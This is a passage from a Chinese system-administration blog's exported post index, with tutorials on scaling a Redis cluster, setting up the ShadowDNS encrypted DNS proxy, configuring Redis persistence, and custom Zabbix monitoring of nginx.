12345678[root@localhost ~]# redis-cli -h 10.0.10.22 -p 7022 #登陆任意一台redis集群节点10.0.10.22:7022&gt; cluster nodes #查看集群22d8c2b425a200c923b81f2682219733f44d9977 10.0.10.21:7024@17024 slave 779eb8b2d6a932d535cfbb1574e4f7c4eb34b2b0 0 1510054584000 4 connectedaa54c9b2b8c191fe3536a63816ba6179ae8e993a 10.0.10.21:7021@17021 master - 0 1510054585000 1 connected 0-5460779eb8b2d6a932d535cfbb1574e4f7c4eb34b2b0 10.0.10.22:7022@17022 myself,master - 0 1510054585000 2 connected 5461-1092200687f86b61031950ee38ca02968676ebc9e08e2 10.0.10.22:7025@17025 slave aa54c9b2b8c191fe3536a63816ba6179ae8e993a 0 1510054585551 5 connected1e3ede5d80592aab56066559f079ba3f877dbf56 10.0.10.23:7023@17023 master - 0 1510054584048 3 connected 10923-16383e5ea2d992183903068695b553fff8016cbe678dd 10.0.10.23:7026@17026 slave 1e3ede5d80592aab56066559f079ba3f877dbf56 0 1510054584000 6 connected 横向扩容-向集群中添加节点1234567891011准备工作：【重要】拷贝源码文件到&#x2F;usr&#x2F;local&#x2F;redis&#x2F;目录下，为了以后节点增加删除cp -a &#x2F;root&#x2F;redis-stable &#x2F;usr&#x2F;local&#x2F;redis&#x2F;Redis30：10.0.10.24 7027Redis30：10.0.10.24 7028在Redis30节点启动两个Redis实例，确保服务启动。[root@localhost etc]# ps -ef |grep redisroot 2064 2047 0 04:55 pts&#x2F;0 00:00:06 redis-server 10.0.10.30:7027 [cluster]root 15365 14614 0 06:33 pts&#x2F;0 00:00:00 redis-server 10.0.10.30:7028 [cluster] 1234567891011121314向集群中添加节点cd &#x2F;usr&#x2F;local&#x2F;redis&#x2F;redis-stable&#x2F;src&#x2F; #切换到新拷贝的源码目录#添加主节点.&#x2F;redis-trib.rb add-node 10.0.10.24:7027 10.0.10.22:7022注：10.0.10.24:7027为新增主节点，10.0.10.22:7022为已存在的任意节点#添加从节点.&#x2F;redis-trib.rb add-node --slave --master-id 03ccad2ba5dd1e062464bc7590400441fafb63f2 10.0.10.24:7028 10.0.10.22:7022--slave，表示添加的是从节点--master-id 03ccad2ba5dd1e062464bc7590400441fafb63f2,主节点的node id，在这里是前面新添加的7027的node id10.0.10.24:7028 新节点10.0.10.22:7022 集群任一个旧节点 重新分配slots 1新增加的主节点是没有slots的,所以需要重新分配，主节点如果没有slots的话，存取数据就都不会被选中。 123cd &#x2F;usr&#x2F;local&#x2F;redis&#x2F;redis-stable&#x2F;src&#x2F; #切换到新拷贝的源码目录.&#x2F;redis-trib.rb reshard 10.0.10.24:7024 #10.0.10.24:7024为新加的主节点以下为交互输入部分 1234567891011#你想移动多少个slots？How many slots do you want to move (from 1 to 16384)? 1000 #谁来接收这些指定多的slots？What is the receiving node ID? 03ccad2ba5dd1e062464bc7590400441fafb63f2 &#x2F;&#x2F;新节点node id Please enter all the source node IDs. Type &#39;all&#39; to use all the nodes as source nodes for the hash slots. Type &#39;done&#39; once you entered all the source nodes IDs. Source node #1:all &#x2F;&#x2F;表示全部节点重新洗牌 Do you want to proceed with the proposed reshard plan (yes&#x2F;no)? yes &#x2F;&#x2F;确认重新分配slots 查看集群情况 1.&#x2F;redis-trib.rb check 10.0.10.24:7024 #后边输入任意节点即可 从集群中删除节点 删除从节点 123格式：.&#x2F;redis-trib.rb del-node 从节点ip:port &#39;从节点ID&#39;.&#x2F;redis-trib.rb del-node 10.0.10.24:7025 &#39;a86c1a2d62fec9a51d6657a0b424730d820b8e65&#39; 1234[root@localhost src]# .&#x2F;redis-trib.rb del-node 10.0.10.24:7025 &#39;a86c1a2d62fec9a51d6657a0b424730d820b8e65&#39;&gt;&gt;&gt; Removing node a86c1a2d62fec9a51d6657a0b424730d820b8e65 from cluster 10.0.10.24:7025&gt;&gt;&gt; Sending CLUSTER FORGET messages to the cluster...&gt;&gt;&gt; SHUTDOWN the node. 删除主节点 1如果主节点有slot，需要先去掉分配的slot，然后在删除主节点 删除其中一个master节点的slots (以删除10.0.0.24:7024主节点为例) 12.&#x2F;redis-trib.rb check 10.0.10.24:7024 #查看24的slots数量，假如是6040.&#x2F;redis-trib.rb reshard 10.0.10.24:7024 1234567891011121314#被删除master的所有slot数量How many slots do you want to move (from 1 to 16384)? 6040 #接收10.0.0.24:7024节点slot的master What is the receiving node ID? 5d8ef5a7fbd72ac586bef04fa6de8a88c0671052 Please enter all the source node IDs. Type &#39;all&#39; to use all the nodes as source nodes for the hash slots. Type &#39;done&#39; once you entered all the source nodes IDs. #复制粘贴被删除master的node-id，此处为“10.0.0.24:7024”的node idSource node #1:03ccad2ba5dd1e062464bc7590400441fafb63f2 Source node #2:done #输入done已完成 Do you want to proceed with the proposed reshard plan (yes&#x2F;no)? yes &#x2F;&#x2F;重新确认slots变更操作 12345678删除了主节点的master slots，这样就可以删除主节点了，这样就回到了没添加节点的状态[root@localhost src]# .&#x2F;redis-trib.rb del-node 10.0.10.24:7024 &#39;3f80334052a981e729377ec55415d0c20b51895c&#39;&gt;&gt;&gt; Removing node 3f80334052a981e729377ec55415d0c20b51895c from cluster 10.0.10.24:7024&gt;&gt;&gt; Sending CLUSTER FORGET messages to the cluster...&gt;&gt;&gt; SHUTDOWN the node.最后使用已存在集群中的节点来查看集群状态：.&#x2F;redis-trib.rb check 10.0.10.22:7022 如果主节点有从节点，在删除主节点之前，需要改变从节点的master12345678910111213141516171819202122232425以此为例[root@localhost src]# .&#x2F;redis-trib.rb check 10.0.10.22:7022&gt;&gt;&gt; Performing Cluster Check (using node 10.0.10.22:7022)M: 779eb8b2d6a932d535cfbb1574e4f7c4eb34b2b0 10.0.10.22:7022 slots:7004-14687 (7684 slots) master 1 additional replica(s)S: 22d8c2b425a200c923b81f2682219733f44d9977 10.0.10.21:7024 slots: (0 slots) slave replicates 779eb8b2d6a932d535cfbb1574e4f7c4eb34b2b0M: aa54c9b2b8c191fe3536a63816ba6179ae8e993a 10.0.10.21:7021 slots:0-7003,14688-15379 (7696 slots) master 1 additional replica(s)S: 00687f86b61031950ee38ca02968676ebc9e08e2 10.0.10.22:7025 slots: (0 slots) slave replicates aa54c9b2b8c191fe3536a63816ba6179ae8e993aM: 1e3ede5d80592aab56066559f079ba3f877dbf56 10.0.10.23:7023 slots:15380-16383 (1004 slots) master 1 additional replica(s)S: e5ea2d992183903068695b553fff8016cbe678dd 10.0.10.23:7026 slots: (0 slots) slave replicates 1e3ede5d80592aab56066559f079ba3f877dbf56[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 123456789101112131415161718计划删除10.0.10.23:7023这个主节点，先改变10.0.10.23:7026的从节点将10.0.10.23:7026加入新的master[root@localhost src]# redis-cli -h 10.0.10.23 -p 702610.0.10.23:7026&gt; 10.0.10.23:7026&gt; cluster replicate aa54c9b2b8c191fe3536a63816ba6179ae8e993a &#x2F;&#x2F;新master idOK10.0.10.23:7026&gt; quit#删除master 主节点.&#x2F;redis-trib.rb del-node 10.0.10.23:7023 &#39;1e3ede5d80592aab56066559f079ba3f877dbf56&#39;错误提示：[ERR] Node 10.0.10.23:7023 is not empty! Reshard data away and try again.#删除该master的slots后再删除master节点.&#x2F;redis-trib.rb reshard 10.0.10.23:7023#再次删除master 主节点.&#x2F;redis-trib.rb del-node 10.0.10.23:7023 &#39;1e3ede5d80592aab56066559f079ba3f877dbf56&#39;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Redis","slug":"Redis","permalink":"https://garywu520.github.io/tags/Redis/"},{"name":"redis集群","slug":"redis集群","permalink":"https://garywu520.github.io/tags/redis%E9%9B%86%E7%BE%A4/"},{"name":"cluster","slug":"cluster","permalink":"https://garywu520.github.io/tags/cluster/"}]},{"title":"DNS加密代理之shadowDNS","slug":"DNS加密代理之shadowDNS","date":"2017-11-04T09:35:12.000Z","updated":"2018-05-04T09:55:27.254Z","comments":true,"path":"2017/11/04/DNS加密代理之shadowDNS/","link":"","permalink":"https://garywu520.github.io/2017/11/04/DNS%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%90%86%E4%B9%8BshadowDNS/","excerpt":"1Github: https:&#x2F;&#x2F;github.com&#x2F;shadowsocks&#x2F;ShadowDNS","text":"1Github: https:&#x2F;&#x2F;github.com&#x2F;shadowsocks&#x2F;ShadowDNS 服务器端部署 建议CentOS7 123yum install m2crypto python-setuptoolseasy_install pippip install shadowdns CentOS6安装 1234567891011121314151617181920212223#安装python-setuptools和shadowdnsyum install python-setuptoolseasy_install pippip install shadowdns#升级swigwget -O swig-3.0.7.tar.gz http:&#x2F;&#x2F;prdownloads.sourceforge.net&#x2F;swig&#x2F;swig-3.0.7.tar.gztar zxf swig-3.0.7.tar.gzcd swig-3.0.7.&#x2F;configure --prefix&#x3D;&#x2F;usrmake &amp;&amp; make install安装完成后，再来看一下版本号。swig -version返回：SWIG Version 3.0.7#手动安装M2Cryptoyum install -y openssl openssl-devel wget --no-check-certificate -O M2Crypto-0.22.5.tar.gz https:&#x2F;&#x2F;pypi.python.org&#x2F;packages&#x2F;source&#x2F;M&#x2F;M2Crypto&#x2F;M2Crypto-0.22.5.tar.gztar zxf M2Crypto-0.22.5.tar.gzcd M2Crypto-0.22.5cp &#x2F;usr&#x2F;include&#x2F;openssl&#x2F;opensslconf-x86_64.h .&#x2F; #手动把头文件复制过来（适用于x86_64）python setup.py install 配置文件 12345678910vim &#x2F;etc&#x2F;shadowdns.json&#123; &quot;server&quot;:&quot;my_server_ip&quot;, &quot;server_port&quot;:8388, &quot;local_address&quot;: &quot;my_server_ip&quot;, &quot;password&quot;:&quot;mypassword&quot;, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;dns&quot;:&quot;8.8.8.8&quot; &#125; Name Explanation server the address your server listens server_port server port local_address the address your local listens password password used for encryption method encryption method, “aes-256-cfb” is recommended dns DNS server to use 运行服务 1ssdns -c &#x2F;etc&#x2F;shadowdns.json 客户端使用 1dig google.com @my_server_ip","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shadowsocks","slug":"shadowsocks","permalink":"https://garywu520.github.io/tags/shadowsocks/"},{"name":"shadowdns","slug":"shadowdns","permalink":"https://garywu520.github.io/tags/shadowdns/"},{"name":"加密代理","slug":"加密代理","permalink":"https://garywu520.github.io/tags/%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%90%86/"}]},{"title":"redis入门及使用","slug":"redis入门及使用","date":"2017-11-04T03:21:11.000Z","updated":"2017-11-04T09:44:56.095Z","comments":true,"path":"2017/11/04/redis入门及使用/","link":"","permalink":"https://garywu520.github.io/2017/11/04/redis%E5%85%A5%E9%97%A8%E5%8F%8A%E4%BD%BF%E7%94%A8/","excerpt":"NoSQL概述 12345678NoSQL,即Not only SQL的简写。泛指非关系型数据库常见的NoSQL开源产品有：Redis、Mongodb、Beansdb等为什么需要NoSQL?(1)High performance - 高并发读写(2)Huge Storage - 海量数据的高效率存储和访问(3)High Scalability &amp;&amp; High Availability - 高扩展性和高可用性","text":"NoSQL概述 12345678NoSQL,即Not only SQL的简写。泛指非关系型数据库常见的NoSQL开源产品有：Redis、Mongodb、Beansdb等为什么需要NoSQL?(1)High performance - 高并发读写(2)Huge Storage - 海量数据的高效率存储和访问(3)High Scalability &amp;&amp; High Availability - 高扩展性和高可用性 什么是redis 1234需要记住以下几点：1. redis是远程的，分为服务端和客户端。一般说redis，是指的redis服务端2. redis是基于内存的。所以比较吃内存3. redis是非关系型数据库（与mysql关系型数据库不同，它不需要数据定义存储数据字典） redis的应用场景 123(1)用作缓存(2)用作队列(3)用作数据存储，redis有非常完备的硬盘持久化机制，保证了redis数据的完整性与安全性。 源码安装Redis服务端和客户端 12341. Redis版本-源码下载 http:&#x2F;&#x2F;download.redis.io&#x2F;redis-stable.tar.gz2. 预装软件（gcc,tcl） gcc是编译器，tcl是语言，redis是由tcl来编写的 1234567tar -zxvf redis-stable.tar.gzmake #编译生成二进制文件，编译后的文件在当前目录下的src目录下make install #安装安装后的目录：#which redis-server&#x2F;usr&#x2F;local&#x2F;bin&#x2F;redis-server 1234567891011121314151617查看帮助[root@Redis redis-stable]# redis-server --helpUsage: .&#x2F;redis-server [&#x2F;path&#x2F;to&#x2F;redis.conf] [options] .&#x2F;redis-server - (read config from stdin) .&#x2F;redis-server -v or --version .&#x2F;redis-server -h or --help .&#x2F;redis-server --test-memory &lt;megabytes&gt;Examples: .&#x2F;redis-server (run the server with default conf) .&#x2F;redis-server &#x2F;etc&#x2F;redis&#x2F;6379.conf .&#x2F;redis-server --port 7777 .&#x2F;redis-server --port 7777 --slaveof 127.0.0.1 8888 .&#x2F;redis-server &#x2F;etc&#x2F;myredis.conf --loglevel verboseSentinel mode: .&#x2F;redis-server &#x2F;etc&#x2F;sentinel.conf --sentinel 123切换到源码目录，拷贝redis.conf默认配置文件到&#x2F;etc&#x2F;redis&#x2F;目录下mkdir &#x2F;etc&#x2F;redis -pcp &#x2F;root&#x2F;redis-stable&#x2F;redis.conf &#x2F;etc&#x2F;redis&#x2F; 配置redis vim /etc/redis/redis.conf 123456789101112131415161718192021222324daemonize yes #配置为后台启动pidfile &#x2F;var&#x2F;run&#x2F;redis_6379.pid #配置redis pid路径port 6379 #指定redis运行的端口，默认端口6379bind 127.0.0.1 #指定redis只接收来自于哪个IP地址的请求，如果不进行设置，那么将处理所有请求timeout 0 #设置客户端连接时的超时时间，单位为秒。0表示关闭此设置loglevel notice #指定redis日志记录级别（共4个级别：debug&#x2F;verbose&#x2F;notice&#x2F;warning）logfile “&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis.log” #指定redis日志输出文件位置databases 16 #可用数据库数量，默认值为16，默认数据库为0，数据库范围在0-(databases-1)之间#保存数据到磁盘，格式： save &lt;seconds&gt; &lt;changes&gt;#指出在多少时间内，有多少次更新操作，就将数据同步到数据文件rdb中。save 900 1 #900秒内，至少有1个key被改变save 300 10 #300秒内，至少有10个key被改变save 60 10000 #60秒内，至少有10000个key被改变rdbcompression yes #保存至本地数据库时(持久化到rdb文件)是否压缩数据，默认为yesrdbchecksum yes #数据持久化到rdb文件过程中是否启用校验，默认为yesdbfilename dump.rdb #数据持久化数据库文件名，默认为dump.rdb#工作目录#即数据库镜像备份的文件放置路径dir .&#x2F; 123456789101112131415161718192021############## redis主从复制 ######################设置本机为salve模式时，需要指定master服务的IP地址及端口，在redis启动时，它会自动从master进行数据同步。#格式：slaveof &lt;masterip&gt; &lt;masterport&gt;#当master服务设置了密码保护时(用requirepass指定的密码)#slave连接master的密码，格式为：masterauth &lt;master-password&gt;# 当从库同主库失去连接或者复制正在进行，从库有两种运行方式：# 1) 如果slave-serve-stale-data设置为yes(默认设置)，从库会继续响应客户端的请求。# 注：响应可能是过时数据# 2) 如果slave-serve-stale-data是指为no，出去INFO和SLAVOF命令之外的任何请求都会返回一个# 错误&quot;SYNC with master in progress&quot;slave-serve-stale-data yes# 从库会按照一个时间间隔向主库发送PINGs.可以通过repl-ping-slave-period参数来设置这个时间间隔，默认是10秒# repl-ping-slave-period 10# repl-timeout 设置主库批量数据传输时间或者ping回复时间间隔，默认值是60秒# 一定要确保repl-timeout大于repl-ping-slave-period# repl-timeout 60 123456789101112################## 安全 ########################### 设置客户端连接后进行任何其他指定前需要使用的密码。# 警告：因为redis速度相当快，所以在一台比较好的服务器下，一个外部的用户可以在一秒钟进行150K次的密码尝试，这意味着你需要指定非常非常强大的密码来防止暴力破解# requirepass foobared# 命令重命名.# 在一个共享环境下可以重命名相对危险的命令。比如把CONFIG重名为一个不容易猜测的字符。# 举例:# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52# 如果想删除一个命令，直接把它重命名为一个空字符&quot;&quot;即可，如下：# rename-command CONFIG &quot;&quot; 123456789101112131415161718192021222324252627282930313233343536################ redis约束 ######################### 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数。如果设置 maxclients 0，表示不作限制。# 当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息# maxclients 128 # 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key；Redis同时也会移除空的list对象；当此方法处理后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作# 注意：Redis新的vm机制，会把Key存放内存，Value会存放在swap区# maxmemory的设置比较适合于把redis当作于类似memcached的缓存来使用，而不适合当做一个真实的DB。# 当把Redis当做一个真实的数据库使用的时候，内存使用将是一个很大的开销# maxmemory &lt;bytes&gt; # 当内存达到最大值的时候Redis会选择删除哪些数据？有五种方式可供选择 # volatile-lru -&gt; 利用LRU算法移除设置过过期时间的key (LRU:最近使用 Least Recently Used )# allkeys-lru -&gt; 利用LRU算法移除任何key# volatile-random -&gt; 移除设置过过期时间的随机key# allkeys-&gt;random -&gt; remove a random key, any key# volatile-ttl -&gt; 移除即将过期的key(minor TTL)# noeviction -&gt; 不移除任何可以，只是返回一个写错误# # 注意：对于上面的策略，如果没有合适的key可以移除，当写的时候Redis会返回一个错误## 写命令包括: set setnx setex append# incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd# sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby# zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby# getset mset msetnx exec sort## 默认是:# maxmemory-policy volatile-lru # LRU 和 minimal TTL 算法都不是精准的算法，而是相对精准的算法(为了节省内存)，所以你可以调整它的准确性，你可以通过maxmemory-samples进行设置# 当默认值为5时会产生足够好的结果；当值设置为10的时候最接近真正的LRU，但会消耗更高的CPU使用率；当值为3时，处理速度最快，但是不准确# maxmemory-samples 5 12345678910111213################ Redis Slow Log ######################## Redis Slow Log 记录实际执行命令所需的时间。执行时间不包括I&#x2F;O计算,比如连接客户端，返回结果等.# 可以通过两个参数设置slow log：#一个是告诉Redis什么是执行时间（以微秒为单位），超过此时间命令会获取日志# 另一个是slow log 的长度。当一个新命令被记录的时候最早的命令将被从队列中移除 # 下面的时间以微秒表示，因此1000000代表一秒。# 注意制定一个负数将关闭慢日志，而设置为0将强制每个命令都会记录slowlog-log-slower-than 10000 # 对日志长度没有限制，只是要注意它会消耗内存# 可以通过 SLOWLOG RESET 回收被慢日志消耗的内存slowlog-max-len 128 启动Redis 1234567891011&#x2F;usr&#x2F;local&#x2F;bin&#x2F;redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf #启动#查看Redis启动情况[root@Redis redis]# ps -ef |grep redisroot 4793 1 0 22:03 ? 00:00:00 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;redis-server 127.0.0.1:6379 [root@Redis redis]# netstat -lntup |grep 6379tcp 0 0 127.0.0.1:6379 0.0.0.0:* LISTEN 4793&#x2F;redis-server 1 #查看redis日志tailf &#x2F;var&#x2F;log&#x2F;redis.log Redis客户端使用 123456格式：redis-cli -h &lt;serverip&gt; -p &lt;serverport&gt;[root@Redis redis]# redis-cli -h 127.0.0.1 -p 6379127.0.0.1:6379&gt; 127.0.0.1:6379&gt; 127.0.0.1:6379&gt; 12345678910111213141516171819202122232425262728293031323334127.0.0.1:6379&gt; 127.0.0.1:6379&gt; info# Serverredis_version:4.0.2redis_git_sha1:00000000redis_git_dirty:0redis_build_id:575be6ca75ca2188redis_mode:standaloneos:Linux 2.6.32-696.13.2.el6.x86_64 x86_64arch_bits:64............# CPUused_cpu_sys:5.34used_cpu_user:3.02used_cpu_sys_children:0.00used_cpu_user_children:0.00# Clustercluster_enabled:0通过info指令可以获取Redis服务器的版本、内存、CPU或Redis集群等信息。当然也可以通过 info stats 或 info CPU来获取具体信息,如：127.0.0.1:6379&gt; info CPU# CPUused_cpu_sys:5.72used_cpu_user:3.14used_cpu_sys_children:0.00used_cpu_user_children:0.00127.0.0.1:6379&gt; 127.0.0.1:6379&gt; 具体输出的信息释义，参考：http:&#x2F;&#x2F;redisdoc.com&#x2F;server&#x2F;info.html Redis持久化 什么是Redis持久化 1Redis的高性能是因为所有的数据都存储在了内存当中，而在系统重启后依然能保证数据不丢失，把内存数据存储到硬盘，这个过程就叫做数据持久化操作。 Redis持久化方式 123456(1) RDB持久化 在指定的时间间隔内，把内存中的数据集快照写入磁盘。(2) AOF持久化 以日志的形式记录服务器所处理的每一次操作，redis服务启动的时候会读取该文件来重新构建数据库，来保证数据是完整的。(3) 无持久化(4) 同时使用RDB和AOF相结合的方式 RDB持久化-优劣势 12345优势：RDB持久化方式只会生成一个文件，可以通过定时任务进行数据备份，可以快速恢复数据。劣势：持久化刚开始且未完成之前，若操作系统出现异常，则会导致部分数据丢失。 RDB持久化配置（默认已配置） 12345678910cat &#x2F;etc&#x2F;redis&#x2F;redis.confsave 900 1save 300 10save 60 10000# The filename where to dump the DBdbfilename dump.rdb dir .&#x2F;保存的持久化文件在当前目录下，我的路径是&#x2F;etc&#x2F;redis&#x2F;目录下 AOF持久化方式-优劣势 1234AOF持久化机制：每修改同步、每秒同步、不同步优势：(1)更高的数据安全性。(2)AOF持久化方式使用append向aof文件追加的形式做持久化，每次服务启动，redis会从AOF文件中读取命令从而实现恢复服务器状态。 AOF持久化-配置 1234567appendonly yes# The name of the append only file (default: &quot;appendonly.aof&quot;)appendfilename &quot;appendonly.aof&quot; #文件存储路径: &quot;dir .&#x2F;&quot;,即&#x2F;etc&#x2F;redis&#x2F;目录下appendfsync always #每修改同步#appendfsync everysec #每秒同步# appendfsync no #不同步","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://garywu520.github.io/tags/NoSQL/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"RDB","slug":"RDB","permalink":"https://garywu520.github.io/tags/RDB/"},{"name":"web缓存","slug":"web缓存","permalink":"https://garywu520.github.io/tags/web%E7%BC%93%E5%AD%98/"},{"name":"非关系型数据库","slug":"非关系型数据库","permalink":"https://garywu520.github.io/tags/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"Redis主从","slug":"Redis主从","permalink":"https://garywu520.github.io/tags/Redis%E4%B8%BB%E4%BB%8E/"},{"name":"redis-server","slug":"redis-server","permalink":"https://garywu520.github.io/tags/redis-server/"},{"name":"redis-cli","slug":"redis-cli","permalink":"https://garywu520.github.io/tags/redis-cli/"},{"name":"redis持久化","slug":"redis持久化","permalink":"https://garywu520.github.io/tags/redis%E6%8C%81%E4%B9%85%E5%8C%96/"},{"name":"AOF","slug":"AOF","permalink":"https://garywu520.github.io/tags/AOF/"}]},{"title":"zabbix监控高级-进阶1","slug":"zabbix监控高级-进阶1","date":"2017-10-29T04:28:20.000Z","updated":"2017-10-30T10:18:14.786Z","comments":true,"path":"2017/10/29/zabbix监控高级-进阶1/","link":"","permalink":"https://garywu520.github.io/2017/10/29/zabbix%E7%9B%91%E6%8E%A7%E9%AB%98%E7%BA%A7-%E8%BF%9B%E9%98%B61/","excerpt":"zabbix数据采集方式123共分两种：(1) server通过轮询方式被动去agent采集(2) agent主动汇报给server","text":"zabbix数据采集方式123共分两种：(1) server通过轮询方式被动去agent采集(2) agent主动汇报给server zabbix基本组件Agent体系 1234saltstack-minion作业执行zabbix-agent数据采集logstash日志采集agent安全扫描 数据存储 1234支持存储类型：(1)关系型数据库(如:mysql)(2)非关系型数据库(3)时间序列的数据库（如:Hbase Opentsdb） 数据展示体系 1234KibanaGrafanaechartsrrdtools (存储+展示) 告警通知 12告警通知基于表达式的计算，如：判断进程数量若大于50则触发告警告警平台：QQ、微信、邮件、语音和短信 使用snmp监控12谈及snmp协议，就需要了解MIB（管理信息库）的概念。管理信息库MIB指明了网络元素所维持的变量（即能够被管理进程查询和设置的信息）。MIB给出了一个网络中所有可能的被管理对象的集合的数据结构。SNMP的管理信息库采用和域名系统DNS相似的树型结构，它的根在最上面。 在Linux中配置snmp 123456vim &#x2F;etc&#x2F;snmp&#x2F;snmpd.confcom2sec admin default admingroup admin v2c adminview admin included .1 80access admin &quot;&quot; any noauth exact admin admin none 1234567grep &#39;^[a-Z]&#39; &#x2F;etc&#x2F;snmp&#x2F;snmpd.conf #确认配置是否有误systemctl start snmpdsystemctl start snmpdnetstat -nulp | grep 161取值测试：snmpget -v2c -c admin 192.168.56.11 .1.3.6.1.4.1.2021.10.1.3.1OID for Linux参考：http:&#x2F;&#x2F;blog.csdn.net&#x2F;buster2014&#x2F;article&#x2F;details&#x2F;46925633 在zabbix的Web平台添加snmp主机 12345zabbix添加snmp主机配置--主机--添加主机：填写被控端主机名--加入相关组 -- 配置SNMP接口信息 -- 添加被控机业务相关描述 -- 勾选已启用 -- 选择并添加SNMP模板 -- 宏：&#123;$SNMP_COMMUNITY&#125; value：admin ------最后添加即可注：宏在此主要用来配置“团体名称” ，宏的不同变量是在所有SNMP模板中定义的，可以导出SNMP模板查看。所以遵循规则即可 图形1检测中 -- 图形 -- 选择界面右上角的“群组、主机和指定图形”来查看具体数值。 图形界面乱码解决方案 1234567(1) windows控制面板--搜索“字体” -- 搜索“微软雅黑” -- 并临时复制到桌面上(2) 在zabbix服务器中切换到zabbix web目录后，执行如下操作： cd fonts&#x2F; 把“桌面”的微软雅黑字体上传到该目录下 mv DejaVuSans.ttf DejaVuSans.ttf.bak #备份zabbix默认使用的原字体 mv msyh.ttc DejaVuSans.ttf #把微软雅黑字体重命名为DejaVuSans.ttf(3) 刷新zabbix web图形界面，可以看到中文已经识别 维护12维护期间不告警维护规则定义：配置 -- 维护 -- 创建维护周期 告警邮件-配置123(1) 管理 -- 告警媒介 -- 配置Email邮件或短信信息（配置邮件服务器或短信平台信息）(2) 用户 -- 报警媒介 -- 添加配置报警媒介（告警邮件发给谁以及哪些发送哪些级别的邮件）(3) 配置 -- 动作 -- 创建动作 （即定义哪些状态的问题会触发动作，然后告警） 自定义(key)监控12345确保zabbix-agent配置文件确定打开以下选项：Include&#x3D;&#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;etc&#x2F;zabbix_agentd.conf.dUnsafeUserParameters&#x3D;1修改完重启zabbix-agent 示例：监控nginx存活 12345678910111213(1)在zabbix-agent上自定义key:cd &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.d&#x2F;vim zabbix-nginx.confUserParameter&#x3D;nginx-alive,curl --head -s http:&#x2F;&#x2F;127.0.0.1&#x2F; | grep &#39;200 OK&#39; | wc -l注: nginx-alive为自定义的key名称，而key的值则是&quot;英文逗号后面是shell命令&quot;结果 自定义key也可以这样写： UserParameter&#x3D;nginx-alive, sh &#x2F;var&#x2F;scripts&#x2F;nginx-alive.sh 重启zabbix-agent服务systemctl restart zabbix-agentsystemctl status zabbix-agent 测试key并添加监控 12345678(1)在zabbix-server中通过zabbix_get命令获取命令 zabbix_get --help zabbix_get -s 192.168.56.12 -k nginx-alive (2) Web中linux-node2创建监控项 配置--主机--linux-node2 --监控项--创建监控项 (3) 检测中--最新数据--过滤linux-node2，然后观察最新值是否为1 1234567zabbix_get常见错误：zabbix_get [25517]: Check access restrictions in Zabbix agent configuration这是因为linux-node2 zabbix-agent配置文件不允许通过zabbix_get命令获取值.或者需要在server参数中定义获取值的服务器IP地址后即可取值，如下：Server&#x3D;192.168.56.11,127.0.0.1 创建触发器 12配置--主机--找到“linux-node2”--触发器--创建触发器表达式规则：最新的T值等于0就告警 12手动stop linux-node2服务器的nginx服务然后稍等片刻，在检测中--仪表盘界面，就能看的刚才的nginx告警了 实例2：自定义key-监控nginx_status状态页信息1234567891011linux-node2配置nginx server &#123; server_name 127.0.0.1; location &#x2F;nginx_status&#123; stub_status on; access_log off; allow 127.0.0.1; deny all; &#125; &#125; 12345678重启nginx访问状态页测试：[root@linux-node2 zabbix_agentd.d]# curl http:&#x2F;&#x2F;127.0.0.1&#x2F;nginx_statusActive connections: 1 server accepts handled requests 3 3 3 Reading: 0 Writing: 1 Waiting: 0 linux-node2配置监控nginx状态值的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859cd &#x2F;etc&#x2F;zabbix&#x2F;vim zabbix_nginx_plugin.sh#!&#x2F;bin&#x2F;bashNGINX_PORT&#x3D;$1nginx_active()&#123; &#x2F;usr&#x2F;bin&#x2F;curl &quot;http:&#x2F;&#x2F;127.0.0.1:&quot;$NGINX_PORT&quot;&#x2F;nginx_status&#x2F;&quot; 2&gt;&#x2F;dev&#x2F;null| grep &#39;Active&#39; | awk &#39;&#123;print $NF&#125;&#39; &#125;nginx_reading()&#123; &#x2F;usr&#x2F;bin&#x2F;curl &quot;http:&#x2F;&#x2F;127.0.0.1:&quot;$NGINX_PORT&quot;&#x2F;nginx_status&#x2F;&quot; 2&gt;&#x2F;dev&#x2F;null| grep &#39;Reading&#39; | awk &#39;&#123;print $2&#125;&#39; &#125;nginx_writing()&#123; &#x2F;usr&#x2F;bin&#x2F;curl &quot;http:&#x2F;&#x2F;127.0.0.1:&quot;$NGINX_PORT&quot;&#x2F;nginx_status&#x2F;&quot; 2&gt;&#x2F;dev&#x2F;null| grep &#39;Writing&#39; | awk &#39;&#123;print $4&#125;&#39; &#125;nginx_waiting()&#123; &#x2F;usr&#x2F;bin&#x2F;curl 